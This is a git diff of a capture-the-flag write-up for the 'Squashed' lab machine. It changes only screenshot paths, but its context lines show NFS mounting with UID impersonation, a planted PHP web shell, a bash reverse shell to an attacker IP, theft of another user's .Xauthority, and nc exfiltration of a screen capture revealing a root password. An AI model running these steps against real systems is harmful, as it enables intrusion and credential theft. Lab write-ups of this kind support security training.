@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.11.87
 ```
 
-![ping](squashed_01_ping.png)
+![ping](screenshots/squashed_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -61,7 +61,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.11.87 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](squashed_02_nmap_allports.png)
+![allports](screenshots/squashed_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -69,7 +69,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](squashed_03_extractports.png)
+![extractports](screenshots/squashed_03_extractports.png)
 
 Open ports from this run: `22,80,111,2049,36443,37605,46585,47331`
 
@@ -87,7 +87,7 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](squashed_04_nmap_targeted.png)
+![targeted 1](screenshots/squashed_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -110,7 +110,7 @@ The site is a static template; fingerprinting confirms the stack and supports tr
 whatweb http://10.129.11.87
 ```
 
-![whatweb](squashed_05_whatweb.png)
+![whatweb](screenshots/squashed_05_whatweb.png)
 
 ---
 ### 2.2 NFS export listing
@@ -121,7 +121,7 @@ NFS is exposed; listing exports is the fastest way to see remotely reachable pat
 showmount -e 10.129.11.87
 ```
 
-![showmount exports](squashed_06_showmount_exports.png)
+![showmount exports](screenshots/squashed_06_showmount_exports.png)
 
 ---
 ### 2.3 Mounting exports and observing ownership
@@ -134,7 +134,7 @@ sudo mount -t nfs -o vers=3 10.129.11.87:/home/ross /mnt/squashed_ross
 sudo mount -t nfs -o vers=3 10.129.11.87:/var/www/html /mnt/squashed_www
 ```
 
-![local mount](squashed_07_local_mount.png)
+![local mount](screenshots/squashed_07_local_mount.png)
 
 On the attacking host, **`/mnt/squashed_ross`** appears as **1001:1001** (readable tree including **`Documents/Passwords.kdbx`** and **`.Xauthority`**). **`/mnt/squashed_www`** is **`drwxr-xr--`** owned by **2017** / group **www-data** â€” access as a normal local user fails until you impersonate **UID 2017**.
 
@@ -145,11 +145,11 @@ tree
 tree -fas /mnt/squashed_ross
 ```
 
-![nfs mount and tree](squashed_08_nfs_mount_tree.png)
+![nfs mount and tree](screenshots/squashed_08_nfs_mount_tree.png)
 
 We have a `Passwords.kdbx` file. Let's see if we can open it:
 
-![keepass kdbx on nfs share](squashed_09_keepassxc.png)
+![keepass kdbx on nfs share](screenshots/squashed_09_keepassxc.png)
 
 We need credentials, **so** we cannot continue with this path until we **achieve** credentials (or recover them later from the GUI path).
 
@@ -157,7 +157,7 @@ We also have **`.Xauthority`** in **`ross`**â€™s home, but it is owned by *
 
 Separately, we get **permission denied** on `squashed_www/` because the directory is owned by **UID 2017** on the server:
 
-![www export uid 2017 permission denied](squashed_09_squashed_www_id.png)
+![www export uid 2017 permission denied](screenshots/squashed_09_squashed_www_id.png)
 
 ---
 ## 3. Foothold
@@ -175,7 +175,7 @@ sudo su squashed
 cd /mnt/squashed_www && tree -fas
 ```
 
-![uid 2017 docroot tree](squashed_10_uid2017_docroot_tree.png)
+![uid 2017 docroot tree](screenshots/squashed_10_uid2017_docroot_tree.png)
 
 Confirm writes reach the web server:
 
@@ -183,7 +183,7 @@ Confirm writes reach the web server:
 echo "test" > /mnt/squashed_www/test.txt
 ```
 
-![test txt in browser](squashed_11_test_txt.png)
+![test txt in browser](screenshots/squashed_11_test_txt.png)
 
 Drop a minimal PHP command dispatcher (syntax must be valid PHP):
 
@@ -195,7 +195,7 @@ Drop a minimal PHP command dispatcher (syntax must be valid PHP):
 
 Then browse to `http://10.129.11.87/cmd.php?cmd=whoami` (or equivalent) to confirm execution:
 
-![cmd php whoami](squashed_12_cmdphp_whoami.png)
+![cmd php whoami](screenshots/squashed_12_cmdphp_whoami.png)
 
 Perfect, we are alex.
 
@@ -214,14 +214,14 @@ nc -lvnp 443
 bash -c "bash -i >& /dev/tcp/10.10.15.206/443 0>&1"
 ```
 
-![reverse shell netcat](squashed_13_reverse_shell_netcat.png)
+![reverse shell netcat](screenshots/squashed_13_reverse_shell_netcat.png)
 
 ```bash
 whoami
 cat /home/alex/user.txt
 ```
 
-![user flag](squashed_14_user_flag.png)
+![user flag](screenshots/squashed_14_user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -236,7 +236,7 @@ Check whether another user has a GUI session and which display is in use:
 w
 ```
 
-![w ross tty7](squashed_14_w_ross_tty7.png)
+![w ross tty7](screenshots/squashed_14_w_ross_tty7.png)
 
 Perfect, **`ross`** is also connected.
 
@@ -253,7 +253,7 @@ cat .Xauthority; echo
 xxd .Xauthority; echo
 ```
 
-![xauthority binary dump uid 1001](squashed_14_newuser_xauth.png)
+![xauthority binary dump uid 1001](screenshots/squashed_14_newuser_xauth.png)
 
 Example `xxd` output (binary MIT-MAGIC-COOKIE data; hostname **`squashed.htb`** visible in the dump):
 
@@ -284,7 +284,7 @@ In a plain **`nc`** reverse shell, **`$HOME` is often unset**, so **`"$HOME/.Xau
 xdpyinfo
 ```
 
-![xdpyinfo success](squashed_16_xdpyinfo_success.png)
+![xdpyinfo success](screenshots/squashed_16_xdpyinfo_success.png)
 
 Enumerate windows on the root display:
 
@@ -292,7 +292,7 @@ Enumerate windows on the root display:
 xwininfo -root -tree -display :0
 ```
 
-![xwininfo keepassxc](squashed_17_xwininfo_keepassxc.png)
+![xwininfo keepassxc](screenshots/squashed_17_xwininfo_keepassxc.png)
 
 ---
 ### 4.2 Screenshot exfiltration and KeePassXC
@@ -308,7 +308,7 @@ nc 10.10.15.206 443 < /tmp/screenshot.xwd
 nc -lvnp 443 > screenshot.xwd
 ```
 
-![xwd exfil and convert](squashed_18_xwd_exfil_convert.png)
+![xwd exfil and convert](screenshots/squashed_18_xwd_exfil_convert.png)
 
 Convert the dump to PNG for easier viewing:
 
@@ -316,11 +316,11 @@ Convert the dump to PNG for easier viewing:
 convert screenshot.xwd screenshot.png
 ```
 
-![keepassxc root entry](squashed_19_keepassxc_root_entry.png)
+![keepassxc root entry](screenshots/squashed_19_keepassxc_root_entry.png)
 
 The screenshot shows **KeePassXC** with an unlocked entry (including a **root** row). You can try unlocking the **`Passwords.kdbx`** you saw on NFS with that password; if it fails, the **system** **`root`** password (for **`su`**) is still the one shown in the entry list:
 
-![keepassxc try password](squashed_20_keepassxc_try_password.png)
+![keepassxc try password](screenshots/squashed_20_keepassxc_try_password.png)
 
 In this run, the **KeePass** unlock attempt did not succeed, but the **root** password visible in the entry list worked for **`su`** on the box.
 
@@ -335,7 +335,7 @@ whoami
 cd /root && cat root.txt
 ```
 
-![su root root txt](squashed_21_su_root_root_txt.png)
+![su root root txt](screenshots/squashed_21_su_root_root_txt.png)
 
 ðŸ **Root flag obtained** 
 
